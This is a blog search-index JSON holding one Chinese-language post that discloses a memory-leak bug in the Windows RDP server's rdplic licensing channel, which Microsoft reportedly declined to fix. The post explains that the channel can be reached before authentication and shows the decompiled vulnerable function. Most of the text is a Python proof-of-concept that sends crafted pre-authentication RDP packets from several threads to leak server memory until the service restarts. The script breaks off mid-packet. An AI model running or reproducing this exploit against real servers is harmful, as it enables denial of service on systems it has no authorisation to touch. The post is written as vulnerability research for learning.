{"meta":{"title":"VictorV的小博客","subtitle":"","description":"记录一些懒得找的东西, 和一些想写的东西","author":"VictorV","url":"http://474172261.github.io","root":"/"},"pages":[],"posts":[{"title":"Windows 远程桌面服务端(RDP server) 内存泄露分享","slug":"rdp_mem_leak_bug","date":"2020-08-26T02:45:44.585Z","updated":"2020-08-26T04:00:28.980Z","comments":true,"path":"2020/08/26/rdp_mem_leak_bug/","link":"","permalink":"http://474172261.github.io/2020/08/26/rdp_mem_leak_bug/","excerpt":"在7月的时候发现了个rdp的内存泄露bug, 微软MSRC决定不管这个bug, 所以我就公开了, 顺便分享一下分析的一些细节, 供大家学习交流 :)","text":"在7月的时候发现了个rdp的内存泄露bug, 微软MSRC决定不管这个bug, 所以我就公开了, 顺便分享一下分析的一些细节, 供大家学习交流 :) RDP协议实现的简介开启远程桌面在windows中, 可以使用下图的选项去实现开启远程桌面 如果不勾选红圈选中的这个选项, 那么在进行登录的用户名和密码交换前, 需要进行一些协议的协商操作; 如果勾选了这个选项, 则会先使用用户名和密码实现一条加密通道, 之后再通过加密通道完成协商. 一个理想的协议实现就应该是后者那样, 连接前用户毕竟都知道用户名和密码了, 那么创建加密通道后再协商应该是最好的, 而不是先协商再认证. 当然, 作为攻击者, 肯定不希望是后者, 那样攻击面变得更小了. 前期的交互如同上图显示的那样, 双方需要经过多次协商, 才能进入后续的认证操作. 在Connection Initial PDU里, 我们需要声明我们要申请的virtual channel, 之后在channel join PDU里请求加入声明的channel. 在完成了图中所有步骤后, 我们就可以发送数据到virtual channel了. 在给virtual channel发送数据前, 并没有完成用户名和密码的认证, 所以, 如果没有勾选红圈的选项, 我们可以在没有用户名/密码的情况下发送数据到virtual channel. Virtual Channelwindows 处理virtual channel 数据的路径为 WDW_OnDataReceived -&gt; WDICART_IcaChannelInputEx -&gt; CRDPWDUMXStack::WDCallback_IcaChannelInput -&gt; CRDPWDUMXStack::OnVirtualChannelData. windows 10 内部有多个virtual channel, 在完成完整认证前, 主要能访问的是如下几个channel: 123456789rdpinptrdpgrfxrdpcmd rdplicrdpdrechoMicrosoft::Windows::RDS::TelemetryMicrosoft::Windows::RDS::BasicInputdrdynvc 此处仅列出部分channel, 下文也只涉及此处列出的channel, 未涉及的可以自己研究一下. 不同的channel有不同的访问方式, 可以通过向channel “drdynvc” 发送channel名称, 来发送数据到名称指定的virtual channel( 支持此方式的channel有 drdynvc, Microsoft::Windows::RDS::BasicInput, Microsoft::Windows::RDS::Telemetry, 还有一些未在上表列出的);另一种方式是通过直接提供channel ID, 发送数据到其它channel. 最终, 他们会调用到CRdpDynVC::OnDataReceived函数来调用给定channel对应的动态处理函数. 当然, 前提是channel已经被open了, 如果没有open, 你可以通过发送type为1的命令到drdynvc去open指定channel. BUG这个bug存在于server 处理 rdplic 通道消息的CUMRDPLicPlugin::HandleClientLicensePdu函数中. 函数大致如下: 12345678910111213int CUMRDPLicPlugin::HandleClientLicensePdu(CUMRDPLicPlugin *this, unsigned int a2, __int64 a3)&#123; v5 = this; if ( a3 &amp;&amp; a2 &gt;= 9 &amp;&amp; (mem_size = *(unsigned int *)(a3 + 4), mem_size &lt;= (unsigned __int64)a2 - 8) )&#123; v9 = operator new[](mem_size); v5-&gt;f_18h.f_8h.memory_60h = (__int64)v9; if ( v9 )&#123; memcpy_0(v9, (const void *)(a3 + 8), *(unsigned int *)(a3 + 4)); ... SetEvent((HANDLE)v5-&gt;f_18h.f_8h.Event_50h); return 0; &#125; &#125;&#125; 表面看起来没什么问题, 问题出在它在set了event后, 并没有触发event的处理函数来处理这片内存, 如果我们再次发送相同的命令, 就会把 v5-&gt;f_18h.f_8h.memory_60h 位置的指针覆盖, 导致原来的内存指针丢失, 从而造成永久的内存泄露(除非重启服务). POCpoc并没有使用CredSSP认证, 需要在测试时在server端关闭红圈中的选项.此处我使用了4个线程去跑, 一个是因为服务端会有一个定时器, 在长时间没有完成认证的情况下, 会主动中断连接, 而我们发送数据时并没有完成认证, 所以需要重新连接. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197#coding:utf-8import socket, sys, structfrom OpenSSL import SSLimport threadingimport timedef send_init_packets(host): data = '\\x03\\x00\\x00\\x13\\x0e\\xe0\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x01\\x00\\x00\\x00' s = socket.socket() s.connect((host, 3389)) s.sendall(data) s.recv(8192) ctx = SSL.Context(SSL.TLSv1_METHOD) tls = SSL.Connection(ctx,s) tls.set_connect_state() tls.do_handshake() return tlsdef send_client_data(tls): # add multitransport p2 = '\\x06\\xc0\\x08\\x00\\x00\\x00\\x00\\x00'+'\\x0a\\xc0\\x08\\x00\\x00\\x02\\x00\\x00' # flag SOFTSYNC_TCP_TO_UDP p = \"\\x03\\x00\\x01\\xca\\x02\\xf0\\x80\\x7f\\x65\\x82\\x07\\xc2\\x04\\x01\\x01\\x04\\x01\\x01\\x01\\x01\\xff\\x30\\x19\\x02\\x01\\x22\\x02\\x01\\x02\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x02\\xff\\xff\\x02\\x01\\x02\\x30\\x19\\x02\\x01\\x01\\x02\\x01\\x01\\x02\\x01\\x01\\x02\\x01\\x01\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x02\\x04\\x20\\x02\\x01\\x02\\x30\\x1c\\x02\\x02\\xff\\xff\\x02\\x02\\xfc\\x17\\x02\\x02\\xff\\xff\\x02\\x01\\x01\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x02\\xff\\xff\\x02\\x01\\x02\\x04\\x82\\x01\\x61\\x00\\x05\\x00\\x14\\x7c\\x00\\x01\\x81\\x48\\x00\\x08\\x00\\x10\\x00\\x01\\xc0\\x00\\x44\\x75\\x63\\x61\\x81\\x34\\x01\\xc0\\xea\\x00\\x0a\\x00\\x08\\x00\\x80\\x07\\x38\\x04\\x01\\xca\\x03\\xaa\\x09\\x04\\x00\\x00\\xee\\x42\\x00\\x00\\x44\\x00\\x45\\x00\\x53\\x00\\x4b\\x00\\x54\\x00\\x4f\\x00\\x50\\x00\\x2d\\x00\\x46\\x00\\x38\\x00\\x34\\x00\\x30\\x00\\x47\\x00\\x49\\x00\\x4b\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xca\\x01\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x0f\\x00\\xaf\\x07\\x62\\x00\\x63\\x00\\x37\\x00\\x38\\x00\\x65\\x00\\x66\\x00\\x36\\x00\\x33\\x00\\x2d\\x00\\x39\\x00\\x64\\x00\\x33\\x00\\x33\\x00\\x2d\\x00\\x34\\x00\\x31\\x00\\x39\\x38\\x00\\x38\\x00\\x2d\\x00\\x39\\x00\\x32\\x00\\x63\\x00\\x66\\x00\\x2d\\x00\\x00\\x31\\x00\\x62\\x00\\x32\\x00\\x64\\x00\\x61\\x00\\x42\\x42\\x42\\x42\\x07\\x00\\x01\\x00\\x00\\x00\\x56\\x02\\x00\\x00\\x50\\x01\\x00\\x00\\x00\\x00\\x64\\x00\\x00\\x00\\x64\\x00\\x00\\x00\\x04\\xc0\\x0c\\x00\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\xc0\\x0c\\x00\\x1b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\xc0\\x38\\x00\\x04\\x00\\x00\\x00\\x72\\x64\\x70\\x73\\x6e\\x64\\x00\\x00\\x0f\\x00\\x00\\xc0\\x63\\x6c\\x69\\x70\\x72\\x64\\x72\\x00\\x00\\x00\\xa0\\xc0\\x64\\x72\\x64\\x79\\x6e\\x76\\x63\\x00\\x00\\x00\\x80\\xc0\"+'rdplic\\x00\\x00'+\"\\x00\\x00\\x00\\x00\"+p2 tpkt_size = struct.pack(\"&gt;h\", len(p)) ber_size = struct.pack(\"&gt;h\", len(p)-12) initial_userdata_size = struct.pack(\"&gt;h\", len(p)-109) connectPDU_size = struct.pack(\"&gt;h\", len(p)-118) userdata_value_size = struct.pack(\"&gt;h\", len(p)-132) cs_net_size = struct.pack(\"&gt;h\", len(p)-390 - len(p2)) ba = bytearray() ba.extend(map(ord, p)) ba[2] = tpkt_size[0] ba[3] = tpkt_size[1] ba[10] = ber_size[0] ba[11] = ber_size[1] ba[107] = initial_userdata_size[0] ba[108] = initial_userdata_size[1] ba[116] = 0x81 ba[117] = connectPDU_size[1] ba[130] = 0x81 ba[131] = userdata_value_size[1] ba[392] = cs_net_size[1] tls.sendall(bytes(ba)) tls.recv(8192)def send_client_info(tls): p = b\"\\x03\\x00\\x01\\x61\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x81\\x52\\x40\\x00\\xa1\\xa5\\x09\\x04\\x09\\x04\\xbb\\x47\\x03\\x00\\x00\\x00\\x0e\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x00\\x00\\x74\\x00\\x65\\x00\\x73\\x00\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x1c\\x00\\x31\\x00\\x39\\x00\\x32\\x00\\x2e\\x00\\x41\\x41\\x41\\x00\\x38\\x00\\x2e\\x00\\x32\\x00\\x33\\x00\\x32\\x00\\x2e\\x00\\x31\\x00\\x00\\x00\\x40\\x00\\x43\\x00\\x3a\\x00\\x5c\\x00\\x57\\x00\\x49\\x00\\x4e\\x00\\x41\\x41\\x41\\x00\\x57\\x00\\x53\\x00\\x5c\\x00\\x73\\x00\\x79\\x00\\x73\\x00\\x74\\x00\\x65\\x00\\x6d\\x00\\x33\\x00\\x32\\x00\\x5c\\x00\\x6d\\x00\\x73\\x00\\x74\\x00\\x73\\x00\\x63\\x00\\x61\\x00\\x78\\x00\\x2e\\x00\\x64\\x00\\x6c\\x00\\x6c\\x00\\x00\\x00\\xa4\\x01\\x00\\x00\\x4d\\x00\\x6f\\x00\\x75\\x00\\x6e\\x00\\x74\\x00\\x61\\x00\\x69\\x00\\x6e\\x00\\x20\\x00\\x53\\x00\\x74\\x00\\x61\\x00\\x6e\\x00\\x64\\x00\\x61\\x00\\x72\\x00\\x64\\x00\\x20\\x00\\x54\\x00\\x69\\x00\\x6d\\x00\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x01\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x4d\\x00\\x6f\\x00\\x75\\x00\\x6e\\x00\\x74\\x00\\x61\\x00\\x69\\x00\\x6e\\x00\\x20\\x00\\x44\\x00\\x61\\x00\\x79\\x00\\x6c\\x00\\x69\\x00\\x67\\x00\\x68\\x00\\x74\\x00\\x20\\x00\\x54\\x00\\x69\\x00\\x6d\\x00\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x02\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc4\\xff\\xff\\xff\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x64\\x00\\x00\\x00\" tls.sendall(p)def send_channel_packets(tls): p1 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x04\\x01\\x00\\x01\\x00\" tls.sendall(p1) p2 = b\"\\x03\\x00\\x00\\x08\\x02\\xf0\\x80\\x28\" tls.sendall(p2) tls.recv(1024) p4 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xeb\" tls.sendall(p4) tls.recv(1024) p5 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xec\" tls.sendall(p5) tls.recv(1024) p6 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xed\" tls.sendall(p6) tls.recv(1024) p7 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xee\" tls.sendall(p7) tls.recv(1024) p8 = b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xef\" tls.sendall(p8) tls.recv(1024)def send_confirm_active(tls, shareid): p = \"\\x03\\x00\\x02\\x63\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x82\\x54\\x54\\x02\\x13\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\xea\\x03\\x06\\x00\\x3e\\x02\\x4d\\x53\\x54\\x53\\x43\\x00\\x17\\x00\\x00\\x00\\x01\\x00\\x18\\x00\\x01\\x00\\x03\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x1d\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x1c\\x00\\x20\\x00\\x01\\x00\\x01\\x00\\x01\\x00\\x80\\x07\\x38\\x04\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x1a\\x01\\x00\\x00\\x00\\x03\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x14\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xaa\\x00\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x01\\x01\\x01\\x00\\x01\\x00\\x00\\x00\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x00\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\xa1\\x06\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x84\\x03\\x00\\x00\\x00\\x00\\x00\\xe4\\x04\\x00\\x00\\x13\\x00\\x28\\x00\\x03\\x00\\x00\\x03\\x78\\x00\\x00\\x00\\x78\\x00\\x00\\x00\\xfc\\x09\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0a\\x00\\x08\\x00\\x06\\x00\\x00\\x00\\x07\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x02\\x00\\x08\\x00\\x0a\\x00\\x01\\x00\\x14\\x00\\x15\\x00\\x09\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x0d\\x00\\x58\\x00\\x91\\x00\\x20\\x00\\x09\\x04\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x0e\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x10\\x00\\x34\\x00\\xfe\\x00\\x04\\x00\\xfe\\x00\\x04\\x00\\xfe\\x00\\x08\\x00\\xfe\\x00\\x08\\x00\\xfe\\x00\\x10\\x00\\xfe\\x00\\x20\\x00\\xfe\\x00\\x40\\x00\\xfe\\x00\\x80\\x00\\xfe\\x00\\x00\\x01\\x40\\x00\\x00\\x08\\x00\\x01\\x00\\x01\\x03\\x00\\x00\\x00\\x0f\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x11\\x00\\x0c\\x00\\x01\\x00\\x00\\x00\\x00\\x28\\x64\\x00\\x14\\x00\\x0c\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x15\\x00\\x0c\\x00\\x02\\x00\\x00\\x00\\x00\\x0a\\x00\\x01\\x1a\\x00\\x08\\x00\\xaf\\x94\\x00\\x00\\x1c\\x00\\x0c\\x00\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1b\\x00\\x06\\x00\\x01\\x00\\x1e\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x18\\x00\\x0b\\x00\\x02\\x00\\x00\\x00\\x03\\x0c\\x00\\x1d\\x00\\x5f\\x00\\x02\\xb9\\x1b\\x8d\\xca\\x0f\\x00\\x4f\\x15\\x58\\x9f\\xae\\x2d\\x1a\\x87\\xe2\\xd6\\x01\\x03\\x00\\x01\\x01\\x03\\xd4\\xcc\\x44\\x27\\x8a\\x9d\\x74\\x4e\\x80\\x3c\\x0e\\xcb\\xee\\xa1\\x9c\\x54\\x05\\x31\\x00\\x31\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x25\\x00\\x00\\x00\\xc0\\xcb\\x08\\x00\\x00\\x00\\x01\\x00\\xc1\\xcb\\x1d\\x00\\x00\\x00\\x01\\xc0\\xcf\\x02\\x00\\x08\\x00\\x00\\x01\\x40\\x00\\x02\\x01\\x01\\x01\\x00\\x01\\x40\\x00\\x02\\x01\\x01\\x04\" ba = bytearray() ba.extend(map(ord, p)) tls.sendall(bytes(ba))def send_establish_session(tls): p = b\"\\x03\\x00\\x00\\x24\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x16\\x16\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x08\\x00\\x1f\\x00\\x00\\x00\\x01\\x00\\xea\\x03\" tls.sendall(p) p = b\"\\x03\\x00\\x00\\x28\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x1a\\x1a\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x0c\\x00\\x14\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" tls.sendall(p) p = b\"\\x03\\x00\\x00\\x28\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x1a\\x1a\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x0c\\x00\\x14\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" tls.sendall(p) p = b\"\\x03\\x00\\x05\\x81\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x85\\x72\\x72\\x05\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x00\\x00\\x2b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa9\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\xa3\\xce\\x20\\x35\\xdb\\x94\\xa5\\xe6\\x0d\\xa3\\x8c\\xfb\\x64\\xb7\\x63\\xca\\xe7\\x9a\\x84\\xc1\\x0d\\x67\\xb7\\x91\\x76\\x71\\x21\\xf9\\x67\\x96\\xc0\\xa2\\x77\\x5a\\xd8\\xb2\\x74\\x4f\\x30\\x35\\x2b\\xe7\\xb0\\xd2\\xfd\\x81\\x90\\x1a\\x8f\\xd5\\x5e\\xee\\x5a\\x6d\\xcb\\xea\\x2f\\xa5\\x2b\\x06\\xe9\\x0b\\x0b\\xa6\\xad\\x01\\x2f\\x7a\\x0b\\x7c\\xff\\x89\\xd3\\xa3\\xe1\\xf8\\x00\\x96\\xa6\\x8d\\x9a\\x42\\xfc\\xab\\x14\\x05\\x8f\\x16\\xde\\xc8\\x05\\xba\\xa0\\xa8\\xed\\x30\\xd8\\x67\\x82\\xd7\\x9f\\x84\\xc3\\x38\\x27\\xda\\x61\\xe3\\xa8\\xc3\\x65\\xe6\\xec\\x0c\\xf6\\x36\\x24\\xb2\\x0b\\xa6\\x17\\x1f\\x46\\x30\\x16\\xc7\\x73\\x60\\x14\\xb5\\xf1\\x3a\\x3c\\x95\\x7d\\x7d\\x2f\\x74\\x7e\\x56\\xff\\x9c\\xe0\\x01\\x32\\x9d\\xf2\\xd9\\x35\\x5e\\x95\\x78\\x2f\\xd5\\x15\\x6c\\x18\\x34\\x0f\\x43\\xd7\\x2b\\x97\\xa9\\xb4\\x28\\xf4\\x73\\x6c\\x16\\xdb\\x43\\xd7\\xe5\\x58\\x0c\\x5a\\x03\\xe3\\x73\\x58\\xd7\\xd9\\x76\\xc2\\xfe\\x0b\\xd7\\xf4\\x12\\x43\\x1b\\x70\\x6d\\x74\\xc2\\x3d\\xf1\\x26\\x60\\x58\\x80\\x31\\x07\\x0e\\x85\\xa3\\x95\\xf8\\x93\\x76\\x99\\x9f\\xec\\xa0\\xd4\\x95\\x5b\\x05\\xfa\\x4f\\xdf\\x77\\x8a\\x7c\\x29\\x9f\\x0b\\x4f\\xa1\\xcb\\xfa\\x95\\x66\\xba\\x47\\xe3\\xb0\\x44\\xdf\\x83\\x03\\x44\\x24\\xf4\\x1e\\xf2\\xe5\\xcb\\xa9\\x53\\x04\\xc2\\x76\\xcb\\x4d\\xc6\\xc2\\xd4\\x3f\\xd3\\x8c\\xb3\\x7c\\xf3\\xaa\\xf3\\x93\\xfe\\x25\\xbd\\x32\\x7d\\x48\\x6e\\x93\\x96\\x68\\xe5\\x18\\x2b\\xea\\x84\\x25\\x69\\x02\\xa5\\x38\\x65\\x6f\\x0f\\x9f\\xf6\\xa1\\x3a\\x1d\\x22\\x9d\\x3f\\x6d\\xe0\\x4c\\xee\\x8b\\x24\\xf0\\xdc\\xff\\x70\\x52\\xa7\\x0d\\xf9\\x52\\x8a\\x1e\\x33\\x1a\\x30\\x11\\x15\\xd7\\xf8\\x95\\xa9\\xbb\\x74\\x25\\x8c\\xe3\\xe9\\x93\\x07\\x43\\xf5\\x50\\x60\\xf7\\x96\\x2e\\xd3\\xff\\x63\\xe0\\xe3\\x24\\xf1\\x10\\x3d\\x8e\\x0f\\x56\\xbc\\x2e\\xb8\\x90\\x0c\\xfa\\x4b\\x96\\x68\\xfe\\x59\\x68\\x21\\xd0\\xff\\x52\\xfe\\x5c\\x7d\\x90\\xd4\\x39\\xbe\\x47\\x9d\\x8e\\x7a\\xaf\\x95\\x4f\\x10\\xea\\x7b\\x7a\\xd3\\xca\\x07\\x28\\x3e\\x4e\\x4b\\x81\\x0e\\xf1\\x5f\\x1f\\x8d\\xbe\\x06\\x40\\x27\\x2f\\x4a\\x03\\x80\\x32\\x67\\x54\\x2f\\x93\\xfd\\x25\\x5d\\x6d\\xa0\\xad\\x23\\x45\\x72\\xff\\xd1\\xeb\\x5b\\x51\\x75\\xa7\\x61\\xe0\\x3f\\xe4\\xef\\xf4\\x96\\xcd\\xa5\\x13\\x8a\\xe6\\x52\\x74\\x70\\xbf\\xc1\\xf9\\xfb\\x68\\x9e\\xdd\\x72\\x8f\\xb4\\x44\\x5f\\x3a\\xcb\\x75\\x2a\\x20\\xa6\\x69\\xd2\\x76\\xf9\\x57\\x46\\x2b\\x5b\\xda\\xba\\x0f\\x9b\\xe0\\x60\\xe1\\x8b\\x90\\x33\\x41\\x0a\\x2d\\xc5\\x06\\xfe\\xd0\\xf0\\xfc\\xde\\x35\\xd4\\x1e\\xaa\\x76\\x0b\\xae\\xf4\\xd5\\xbd\\xfa\\xf3\\x55\\xf5\\xc1\\x67\\x65\\x75\\x1c\\x1d\\x5e\\xe8\\x3a\\xfe\\x54\\x50\\x23\\x04\\xae\\x2e\\x71\\xc2\\x76\\x97\\xe6\\x39\\xc6\\xb2\\x25\\x87\\x92\\x63\\x52\\x61\\xd1\\x6c\\x07\\xc1\\x1c\\x00\\x30\\x0d\\xa7\\x2f\\x55\\xa3\\x4f\\x23\\xb2\\x39\\xc7\\x04\\x6c\\x97\\x15\\x7a\\xd7\\x24\\x33\\x91\\x28\\x06\\xa6\\xe7\\xc3\\x79\\x5c\\xae\\x7f\\x50\\x54\\xc2\\x38\\x1e\\x90\\x23\\x1d\\xd0\\xff\\x5a\\x56\\xd6\\x12\\x91\\xd2\\x96\\xde\\xcc\\x62\\xc8\\xee\\x9a\\x44\\x07\\xc1\\xec\\xf7\\xb6\\xd9\\x9c\\xfe\\x30\\x1c\\xdd\\xb3\\x3b\\x93\\x65\\x3c\\xb4\\x80\\xfb\\xe3\\x87\\xf0\\xee\\x42\\xd8\\xcf\\x08\\x98\\x4d\\xe7\\x6b\\x99\\x0a\\x43\\xed\\x13\\x72\\x90\\xa9\\x67\\xfd\\x3c\\x63\\x36\\xec\\x55\\xfa\\xf6\\x1f\\x35\\xe7\\x28\\xf3\\x87\\xa6\\xce\\x2e\\x34\\xaa\\x0d\\xb2\\xfe\\x17\\x18\\xa2\\x0c\\x4e\\x5f\\xf0\\xd1\\x98\\x62\\x4a\\x2e\\x0e\\xb0\\x8d\\xb1\\x7f\\x32\\x52\\x8e\\x87\\xc9\\x68\\x7c\\x0c\\xef\\xee\\x88\\xae\\x74\\x2a\\x33\\xff\\x4b\\x4d\\xc5\\xe5\\x18\\x38\\x74\\xc7\\x28\\x83\\xf7\\x72\\x87\\xfc\\x79\\xfb\\x3e\\xce\\xd0\\x51\\x13\\x2d\\x7c\\xb4\\x58\\xa2\\xe6\\x28\\x67\\x4f\\xec\\xa6\\x81\\x6c\\xf7\\x9a\\x29\\xa6\\x3b\\xca\\xec\\xb8\\xa1\\x27\\x50\\xb7\\xef\\xfc\\x81\\xbf\\x5d\\x86\\x20\\x94\\xc0\\x1a\\x0c\\x41\\x50\\xa9\\x5e\\x10\\x4a\\x82\\xf1\\x74\\x1f\\x78\\x21\\xf5\\x70\\x61\\x24\\x00\\x3d\\x47\\x5f\\xf3\\x25\\x80\\x3c\\x4b\\xea\\xa3\\xf4\\x77\\xea\\xa1\\x42\\x1a\\x17\\x0f\\x6d\\xa8\\x35\\x9e\\x91\\x26\\x34\\x43\\x04\\xc6\\xc6\\x5b\\x21\\x7d\\x8c\\xc7\\x22\\x91\\x7b\\x2c\\x2d\\x2f\\xd6\\x7e\\xa5\\x52\\xa8\\x08\\x80\\xeb\\x60\\xd1\\x44\\x09\\x8e\\x3c\\xa1\\xaa\\x67\\x60\\x0a\\x26\\xc6\\xb5\\xc6\\x79\\xa6\\x4f\\x8b\\x8c\\x25\\x5c\\xf1\\x0b\\x23\\xf4\\xd8\\xa6\\x6d\\xf1\\x91\\x78\\xf9\\xe5\\x2a\\x50\\x2f\\x5a\\x44\\x22\\xd9\\x19\\x5c\\xaf\\xd6\\xac\\x97\\xa2\\xf8\\x0d\\x0c\\xe3\\xdd\\x88\\x48\\x98\\x28\\x0b\\x8b\\xbd\\x76\\xdc\\xde\\xca\\xe2\\xc2\\x4a\\x87\\x50\\xd4\\x8c\\x77\\x5a\\xd8\\xb2\\x74\\x4f\\x30\\x35\\xbf\\x28\\xae\\xd9\\xa2\\x98\\xa5\\xbc\\x60\\xca\\xb8\\x90\\x4d\\x20\\x46\\xd9\\x8a\\x1a\\x30\\x01\\x8b\\x38\\x63\\x1a\\x57\\x09\\x51\\x46\\x95\\x9b\\xd8\\x80\\x0c\\xb0\\x77\\x24\\xbf\\x2b\\xd3\\x57\\x22\\xd9\\x19\\x5c\\xaf\\xd6\\xac\\x97\\xa2\\xf8\\x0d\\x0c\\xe3\\xdd\\x88\\x48\\x98\\x28\\x0b\\x8b\\xbd\\x76\\xdc\\xde\\xca\\xe2\\xc2\\x4a\\x87\\x50\\xd4\\x8c\\x56\\x92\\x38\\xed\\x6b\\x9b\\x5b\\x1f\\xba\\x53\\xa1\\x0e\\xf7\\x75\\x10\\x53\\x22\\x4c\\x0a\\x75\\x88\\x54\\x69\\x3f\\x3b\\xf3\\x18\\x67\\x6b\\x0f\\x19\\xd1\\x00\\x25\\x86\\xcd\\xa8\\xd9\\xdd\\x1d\\x8d\\x26\\x87\\x54\\xd9\\x79\\xc0\\x74\\x65\\x90\\xd7\\x33\\x32\\xaf\\xba\\x9d\\x5a\\xd5\\x6c\\x7c\\xa1\\x47\\xe1\\x49\\x6e\\x1c\\xce\\x9f\\x62\\xaa\\x26\\x16\\x3f\\x3c\\xec\\x5b\\x49\\xe5\\xc0\\x60\\xd4\\xbe\\xa7\\x88\\xbc\\xa1\\x9f\\x29\\x71\\x8c\\xeb\\x69\\xf8\\x73\\xfb\\xaf\\x29\\xaa\\x40\\x1b\\xe5\\x92\\xd2\\x77\\xa7\\x2b\\xfb\\xb6\\x77\\xb7\\x31\\xfb\\xdc\\x1e\\x63\\x63\\x7d\\xf2\\xfe\\